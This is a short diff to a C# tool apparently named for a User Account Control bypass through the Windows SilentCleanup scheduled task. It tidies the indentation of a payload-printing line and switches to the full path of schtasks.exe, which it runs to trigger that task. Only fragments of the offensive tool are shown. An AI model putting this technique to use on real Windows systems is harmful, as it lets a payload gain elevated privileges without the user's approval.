@@ -26,8 +26,8 @@ namespace UACBypass_SilentCleanup
 
             if (args.Length > 0)
             {
-                payload = args[0];             
-        Console.WriteLine(@"[+] Payload to be Executed " + payload);
+                payload = args[0];
+                Console.WriteLine(@"[+] Payload to be Executed " + payload);
             }
             else
             {
@@ -61,7 +61,7 @@ namespace UACBypass_SilentCleanup
                 ProcessStartInfo startInfo = new ProcessStartInfo();
                 startInfo.CreateNoWindow = true;
                 startInfo.UseShellExecute = false;
-                startInfo.FileName = "schtasks.exe";
+                startInfo.FileName = @"c:\windows\system32\schtasks.exe";
                 startInfo.Arguments = @"/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I";
                 Process.Start(startInfo);
 
